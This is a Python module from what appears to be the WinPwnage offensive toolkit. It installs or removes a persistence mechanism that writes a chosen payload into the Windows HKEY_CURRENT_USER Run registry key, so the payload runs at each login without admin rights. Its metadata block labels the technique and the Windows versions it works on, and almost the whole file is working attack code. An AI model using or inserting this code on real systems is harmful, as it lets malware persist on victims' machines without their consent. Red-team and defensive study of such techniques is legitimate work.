from winpwnage.core.prints import *
from winpwnage.core.utils import *

hkcurun_info = {
	"Description": "Gain persistence using HKEY_CURRENT_USER Run registry key",
	"Id": "6",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "hkcu_run",
	"Function Payload": True,
}


def hkcu_run(payload, name="", add=True):
	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=payload):
				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payload))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to install persistence")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False